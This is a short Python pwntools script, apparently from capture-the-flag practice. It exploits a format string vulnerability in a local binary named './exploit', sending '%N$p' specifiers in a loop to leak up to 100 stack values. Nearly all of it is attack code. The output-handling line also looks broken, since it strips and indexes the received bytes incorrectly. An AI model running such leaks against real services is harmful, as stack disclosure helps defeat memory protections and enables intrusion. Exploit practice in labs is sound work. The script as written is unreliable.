#!/usr/bin/python3
"""
This script leak stack with format string vuln

Just modify LEAK_SIZE to change how much info leak
"""

from pwn import *

io = process('./exploit')
LEAK_SIZE = 100

for i in range(1, LEAK_SIZE):
    io.sendline(bytes(f"%{i}$p ", "ascii"))
    leak = io.recvline().strip(" ")[0].decode("utf-8") 
    print(f"{i}: {leak}")

io.close()
